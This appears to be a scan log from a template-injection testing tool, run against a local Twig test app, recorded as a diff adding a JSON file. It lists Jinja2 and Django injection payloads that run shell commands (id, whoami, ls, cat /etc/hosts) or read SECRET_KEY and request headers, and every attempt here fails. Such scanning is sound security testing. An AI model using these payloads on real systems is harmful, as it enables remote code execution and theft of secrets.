@@ -1,0 +1,478 @@
+// Last scan: 2025-06-14 06:24:02
+// Launch args: --url http://localhost:9000/?username= --method BOTH --delay 0.0 --timeout 5 --verbose --hard_test
+[
+    {
+        "url": "http://localhost:9000/?username=",
+        "engine": "twig",
+        "validated_points": [
+            {
+                "type": "form_field",
+                "method": "GET",
+                "name": "username",
+                "url": "http://localhost:9000/?username=",
+                "engine_confirmed": "twig"
+            }
+        ],
+        "tests": [
+            {
+                "payload": "{{ cycler.__init__.__globals__.os.popen('id').read() }}",
+                "expected": "uid=",
+                "actual": "Welcome !",
+                "success": false,
+                "engine_tested": "jinja2",
+                "point": {
+                    "type": "form_field",
+                    "method": "GET",
+                    "name": "username",
+                    "url": "http://localhost:9000/?username=",
+                    "engine_confirmed": "twig"
+                }
+            },
+            {
+                "payload": "{{ config.__class__.__init__.__globals__['os'].popen('whoami').read() }}",
+                "expected": " config.__class__.__init__.__globals__['os'].popen('whoami').read() ",
+                "actual": "Welcome !",
+                "success": false,
+                "engine_tested": "jinja2",
+                "point": {
+                    "type": "form_field",
+                    "method": "GET",
+                    "name": "username",
+                    "url": "http://localhost:9000/?username=",
+                    "engine_confirmed": "twig"
+                }
+            },
+            {
+                "payload": "{{''.__class__.__mro__[1].__subclasses__()[396]('ls',shell=True,stdout=-1).communicate()[0].decode() }}",
+                "expected": "''.__class__.__mro__[1].__subclasses__()[396]('ls',shell=True,stdout=-1).communicate()[0].decode() ",
+                "actual": "<br />\n<b>Fatal error</b>:  Uncaught Twig\\Error\\SyntaxError: Function name must be an identifier in &quot;__string_template__e499d476ffd416a2cdf338b5b27404dd&quot; at line 1. in D:\\CODES\\twig_ssti\\PHPSSTI\\vendor\\twig\\twig\\src\\ExpressionParser\\Infix\\FunctionExpressionParser.php:40\nStack trace:\n#0 D:\\",
+                "success": false,
+                "engine_tested": "jinja2",
+                "point": {
+                    "type": "form_field",
+                    "method": "GET",
+                    "name": "username",
+                    "url": "http://localhost:9000/?username=",
+                    "engine_confirmed": "twig"
+                }
+            },
+            {
+                "payload": "{{ namespace().__class__.__init__.__globals__.os.popen('id').read() }}",
+                "expected": "uid=",
+                "actual": "<br />\n<b>Fatal error</b>:  Uncaught Twig\\Error\\SyntaxError: Unknown &quot;namespace&quot; function in &quot;__string_template__e876e94da4f5047068f38225251197d6&quot; at line 1. in D:\\CODES\\twig_ssti\\PHPSSTI\\vendor\\twig\\twig\\src\\Parser.php:446\nStack trace:\n#0 D:\\CODES\\twig_ssti\\PHPSSTI\\vendor\\twig\\t",
+                "success": false,
+                "engine_tested": "jinja2",
+                "point": {
+                    "type": "form_field",
+                    "method": "GET",
+                    "name": "username",
+                    "url": "http://localhost:9000/?username=",
+                    "engine_confirmed": "twig"
+                }
+            },
+            {
+                "payload": "{{ url_for.__globals__['os'].popen('whoami').read() }}",
+                "expected": " url_for.__globals__['os'].popen('whoami').read() ",
+                "actual": "Welcome !",
+                "success": false,
+                "engine_tested": "jinja2",
+                "point": {
+                    "type": "form_field",
+                    "method": "GET",
+                    "name": "username",
+                    "url": "http://localhost:9000/?username=",
+                    "engine_confirmed": "twig"
+                }
+            },
+            {
+                "payload": "{{ ''.__class__.__mro__[1].__subclasses__()[59]('cat /etc/hosts',shell=True,stdout=-1).communicate()[0].decode() }}",
+                "expected": "localhost",
+                "actual": "<br />\n<b>Fatal error</b>:  Uncaught Twig\\Error\\SyntaxError: Function name must be an identifier in &quot;__string_template__73a6684cb9fe6c3e095428d5fc4ee813&quot; at line 1. in D:\\CODES\\twig_ssti\\PHPSSTI\\vendor\\twig\\twig\\src\\ExpressionParser\\Infix\\FunctionExpressionParser.php:40\nStack trace:\n#0 D:\\",
+                "success": false,
+                "engine_tested": "jinja2",
+                "point": {
+                    "type": "form_field",
+                    "method": "GET",
+                    "name": "username",
+                    "url": "http://localhost:9000/?username=",
+                    "engine_confirmed": "twig"
+                }
+            },
+            {
+                "payload": "{{ self._TemplateReference__context.cycler.__init__.__globals__['os'].popen('ls').read() }}",
+                "expected": " self._TemplateReference__context.cycler.__init__.__globals__['os'].popen('ls').read() ",
+                "actual": "Welcome !",
+                "success": false,
+                "engine_tested": "jinja2",
+                "point": {
+                    "type": "form_field",
+                    "method": "GET",
+                    "name": "username",
+                    "url": "http://localhost:9000/?username=",
+                    "engine_confirmed": "twig"
+                }
+            },
+            {
+                "payload": "{{ config.__class__.__init__.__globals__['os'].popen('echo test').read() }}",
+                "expected": "test",
+                "actual": "Welcome !",
+                "success": false,
+                "engine_tested": "jinja2",
+                "point": {
+                    "type": "form_field",
+                    "method": "GET",
+                    "name": "username",
+                    "url": "http://localhost:9000/?username=",
+                    "engine_confirmed": "twig"
+                }
+            },
+            {
+                "payload": "{% debug %}",
+                "expected": "Context",
+                "actual": "<br />\n<b>Fatal error</b>:  Uncaught Twig\\Error\\SyntaxError: Unknown &quot;debug&quot; tag in &quot;__string_template__a2c827cbaf45d1cb18d5112c0b0147aa&quot; at line 1. in D:\\CODES\\twig_ssti\\PHPSSTI\\vendor\\twig\\twig\\src\\Parser.php:208\nStack trace:\n#0 D:\\CODES\\twig_ssti\\PHPSSTI\\vendor\\twig\\twig\\src\\P",
+                "success": false,
+                "engine_tested": "django",
+                "point": {
+                    "type": "form_field",
+                    "method": "GET",
+                    "name": "username",
+                    "url": "http://localhost:9000/?username=",
+                    "engine_confirmed": "twig"
+                }
+            },
+            {
+                "payload": "{{ settings.SECRET_KEY }}",
+                "expected": " settings.SECRET_KEY ",
+                "actual": "Welcome !",
+                "success": false,
+                "engine_tested": "django",
+                "point": {
+                    "type": "form_field",
+                    "method": "GET",
+                    "name": "username",
+                    "url": "http://localhost:9000/?username=",
+                    "engine_confirmed": "twig"
+                }
+            },
+            {
+                "payload": "{{ request.META }}",
+                "expected": "HTTP_",
+                "actual": "Welcome !",
+                "success": false,
+                "engine_tested": "django",
+                "point": {
+                    "type": "form_field",
+                    "method": "GET",
+                    "name": "username",
+                    "url": "http://localhost:9000/?username=",
+                    "engine_confirmed": "twig"
+                }
+            },
+            {
+                "payload": "{{ request.resolver_match }}",
+                "expected": "ResolverMatch",
+                "actual": "Welcome !",
+                "success": false,
+                "engine_tested": "django",
+                "point": {
+                    "type": "form_field",
+                    "method": "GET",
+                    "name": "username",
+                    "url": "http://localhost:9000/?username=",
+                    "engine_confirmed": "twig"
+                }
+            },
+            {
+                "payload": "{% debug %}",
+                "expected": "Context",
+                "actual": "<br />\n<b>Fatal error</b>:  Uncaught Twig\\Error\\SyntaxError: Unknown &quot;debug&quot; tag in &quot;__string_template__a2c827cbaf45d1cb18d5112c0b0147aa&quot; at line 1. in D:\\CODES\\twig_ssti\\PHPSSTI\\vendor\\twig\\twig\\src\\Parser.php:208\nStack trace:\n#0 D:\\CODES\\twig_ssti\\PHPSSTI\\vendor\\twig\\twig\\src\\P",
+                "success": false,
+                "engine_tested": "django",
+                "point": {
+                    "type": "form_field",
+                    "method": "GET",
+                    "name": "username",
+                    "url": "http://localhost:9000/?username=",
+                    "engine_confirmed": "twig"
+                }
+            },
+            {
+                "payload": "{{ view.__class__.__init__.__globals__ }}",
+                "expected": " view.__class__.__init__.__globals__ ",
+                "actual": "Welcome !",
+                "success": false,
+                "engine_tested": "django",
+                "point": {
+                    "type": "form_field",
+                    "method": "GET",
+                    "name": "username",
+                    "url": "http://localhost:9000/?username=",
+                    "engine_confirmed": "twig"
+                }
+            },
+            {
+                "payload": "{{ request.META.HTTP_USER_AGENT }}",
+                "expected": "Mozilla",
+                "actual": "Welcome !",
+                "success": false,
+                "engine_tested": "django",
+                "point": {
+                    "type": "form_field",
+                    "method": "GET",
+                    "name": "username",
+                    "url": "http://localhost:9000/?username=",
+                    "engine_confirmed": "twig"
+                }
+            },
+            {
+                "payload": "{{ request.__class__.__base__ }}",
+                "expected": "HttpRequest",
+                "actual": "Welcome !",
+                "success": false,
+                "engine_tested": "django",
+                "point": {
+                    "type": "form_field",
+                    "method": "GET",
+                    "name": "username",
+                    "url": "http://localhost:9000/?username=",
+                    "engine_confirmed": "twig"
+                }
+            },
+            {
+                "payload": "{{ request.resolver_match.url_name }}",
+                "expected": "index",
+                "actual": "Welcome !",
+                "success": false,
+                "engine_tested": "django",
+                "point": {
+                    "type": "form_field",
+                    "method": "GET",
+                    "name": "username",
+                    "url": "http://localhost:9000/?username=",
+                    "engine_confirmed": "twig"
+                }
+            },
+            {
+                "payload": "{{ cycler.__init__.__globals__.os.popen('id').read() }}",
+                "expected": "uid=",
+                "actual": "Welcome !",
+                "success": false,
+                "engine_tested": "jinja2",
+                "point": {
+                    "type": "url_param",
+                    "method": "GET",
+                    "name": "username",
+                    "url": "http://localhost:9000/?username="
+                }
+            },
+            {
+                "payload": "{{ config.__class__.__init__.__globals__['os'].popen('whoami').read() }}",
+                "expected": " config.__class__.__init__.__globals__['os'].popen('whoami').read() ",
+                "actual": "Welcome !",
+                "success": false,
+                "engine_tested": "jinja2",
+                "point": {
+                    "type": "url_param",
+                    "method": "GET",
+                    "name": "username",
+                    "url": "http://localhost:9000/?username="
+                }
+            },
+            {
+                "payload": "{{''.__class__.__mro__[1].__subclasses__()[396]('ls',shell=True,stdout=-1).communicate()[0].decode() }}",
+                "expected": "''.__class__.__mro__[1].__subclasses__()[396]('ls',shell=True,stdout=-1).communicate()[0].decode() ",
+                "actual": "<br />\n<b>Fatal error</b>:  Uncaught Twig\\Error\\SyntaxError: Function name must be an identifier in &quot;__string_template__e499d476ffd416a2cdf338b5b27404dd&quot; at line 1. in D:\\CODES\\twig_ssti\\PHPSSTI\\vendor\\twig\\twig\\src\\ExpressionParser\\Infix\\FunctionExpressionParser.php:40\nStack trace:\n#0 D:\\",
+                "success": false,
+                "engine_tested": "jinja2",
+                "point": {
+                    "type": "url_param",
+                    "method": "GET",
+                    "name": "username",
+                    "url": "http://localhost:9000/?username="
+                }
+            },
+            {
+                "payload": "{{ namespace().__class__.__init__.__globals__.os.popen('id').read() }}",
+                "expected": "uid=",
+                "actual": "<br />\n<b>Fatal error</b>:  Uncaught Twig\\Error\\SyntaxError: Unknown &quot;namespace&quot; function in &quot;__string_template__e876e94da4f5047068f38225251197d6&quot; at line 1. in D:\\CODES\\twig_ssti\\PHPSSTI\\vendor\\twig\\twig\\src\\Parser.php:446\nStack trace:\n#0 D:\\CODES\\twig_ssti\\PHPSSTI\\vendor\\twig\\t",
+                "success": false,
+                "engine_tested": "jinja2",
+                "point": {
+                    "type": "url_param",
+                    "method": "GET",
+                    "name": "username",
+                    "url": "http://localhost:9000/?username="
+                }
+            },
+            {
+                "payload": "{{ url_for.__globals__['os'].popen('whoami').read() }}",
+                "expected": " url_for.__globals__['os'].popen('whoami').read() ",
+                "actual": "Welcome !",
+                "success": false,
+                "engine_tested": "jinja2",
+                "point": {
+                    "type": "url_param",
+                    "method": "GET",
+                    "name": "username",
+                    "url": "http://localhost:9000/?username="
+                }
+            },
+            {
+                "payload": "{{ ''.__class__.__mro__[1].__subclasses__()[59]('cat /etc/hosts',shell=True,stdout=-1).communicate()[0].decode() }}",
+                "expected": "localhost",
+                "actual": "<br />\n<b>Fatal error</b>:  Uncaught Twig\\Error\\SyntaxError: Function name must be an identifier in &quot;__string_template__73a6684cb9fe6c3e095428d5fc4ee813&quot; at line 1. in D:\\CODES\\twig_ssti\\PHPSSTI\\vendor\\twig\\twig\\src\\ExpressionParser\\Infix\\FunctionExpressionParser.php:40\nStack trace:\n#0 D:\\",
+                "success": false,
+                "engine_tested": "jinja2",
+                "point": {
+                    "type": "url_param",
+                    "method": "GET",
+                    "name": "username",
+                    "url": "http://localhost:9000/?username="
+                }
+            },
+            {
+                "payload": "{{ self._TemplateReference__context.cycler.__init__.__globals__['os'].popen('ls').read() }}",
+                "expected": " self._TemplateReference__context.cycler.__init__.__globals__['os'].popen('ls').read() ",
+                "actual": "Welcome !",
+                "success": false,
+                "engine_tested": "jinja2",
+                "point": {
+                    "type": "url_param",
+                    "method": "GET",
+                    "name": "username",
+                    "url": "http://localhost:9000/?username="
+                }
+            },
+            {
+                "payload": "{{ config.__class__.__init__.__globals__['os'].popen('echo test').read() }}",
+                "expected": "test",
+                "actual": "Welcome !",
+                "success": false,
+                "engine_tested": "jinja2",
+                "point": {
+                    "type": "url_param",
+                    "method": "GET",
+                    "name": "username",
+                    "url": "http://localhost:9000/?username="
+                }
+            },
+            {
+                "payload": "{% debug %}",
+                "expected": "Context",
+                "actual": "<br />\n<b>Fatal error</b>:  Uncaught Twig\\Error\\SyntaxError: Unknown &quot;debug&quot; tag in &quot;__string_template__a2c827cbaf45d1cb18d5112c0b0147aa&quot; at line 1. in D:\\CODES\\twig_ssti\\PHPSSTI\\vendor\\twig\\twig\\src\\Parser.php:208\nStack trace:\n#0 D:\\CODES\\twig_ssti\\PHPSSTI\\vendor\\twig\\twig\\src\\P",
+                "success": false,
+                "engine_tested": "django",
+                "point": {
+                    "type": "url_param",
+                    "method": "GET",
+                    "name": "username",
+                    "url": "http://localhost:9000/?username="
+                }
+            },
+            {
+                "payload": "{{ settings.SECRET_KEY }}",
+                "expected": " settings.SECRET_KEY ",
+                "actual": "Welcome !",
+                "success": false,
+                "engine_tested": "django",
+                "point": {
+                    "type": "url_param",
+                    "method": "GET",
+                    "name": "username",
+                    "url": "http://localhost:9000/?username="
+                }
+            },
+            {
+                "payload": "{{ request.META }}",
+                "expected": "HTTP_",
+                "actual": "Welcome !",
+                "success": false,
+                "engine_tested": "django",
+                "point": {
+                    "type": "url_param",
+                    "method": "GET",
+                    "name": "username",
+                    "url": "http://localhost:9000/?username="
+                }
+            },
+            {
+                "payload": "{{ request.resolver_match }}",
+                "expected": "ResolverMatch",
+                "actual": "Welcome !",
+                "success": false,
+                "engine_tested": "django",
+                "point": {
+                    "type": "url_param",
+                    "method": "GET",
+                    "name": "username",
+                    "url": "http://localhost:9000/?username="
+                }
+            },
+            {
+                "payload": "{% debug %}",
+                "expected": "Context",
+                "actual": "<br />\n<b>Fatal error</b>:  Uncaught Twig\\Error\\SyntaxError: Unknown &quot;debug&quot; tag in &quot;__string_template__a2c827cbaf45d1cb18d5112c0b0147aa&quot; at line 1. in D:\\CODES\\twig_ssti\\PHPSSTI\\vendor\\twig\\twig\\src\\Parser.php:208\nStack trace:\n#0 D:\\CODES\\twig_ssti\\PHPSSTI\\vendor\\twig\\twig\\src\\P",
+                "success": false,
+                "engine_tested": "django",
+                "point": {
+                    "type": "url_param",
+                    "method": "GET",
+                    "name": "username",
+                    "url": "http://localhost:9000/?username="
+                }
+            },
+            {
+                "payload": "{{ view.__class__.__init__.__globals__ }}",
+                "expected": " view.__class__.__init__.__globals__ ",
+                "actual": "Welcome !",
+                "success": false,
+                "engine_tested": "django",
+                "point": {
+                    "type": "url_param",
+                    "method": "GET",
+                    "name": "username",
+                    "url": "http://localhost:9000/?username="
+                }
+            },
+            {
+                "payload": "{{ request.META.HTTP_USER_AGENT }}",
+                "expected": "Mozilla",
+                "actual": "Welcome !",
+                "success": false,
+                "engine_tested": "django",
+                "point": {
+                    "type": "url_param",
+                    "method": "GET",
+                    "name": "username",
+                    "url": "http://localhost:9000/?username="
+                }
+            },
+            {
+                "payload": "{{ request.__class__.__base__ }}",
+                "expected": "HttpRequest",
+                "actual": "Welcome !",
+                "success": false,
+                "engine_tested": "django",
+                "point": {
+                    "type": "url_param",
+                    "method": "GET",
+                    "name": "username",
+                    "url": "http://localhost:9000/?username="
+                }
+            },
+            {
+                "payload": "{{ request.resolver_match.url_name }}",
+                "expected": "index",
+                "actual": "Welcome !",
+                "success": false,
+                "engine_tested": "django",
+                "point": {
+                    "type": "url_param",
+                    "method": "GET",
+                    "name": "username",
+                    "url": "http://localhost:9000/?username="
+                }
+            }
+        ]
+    }
+]
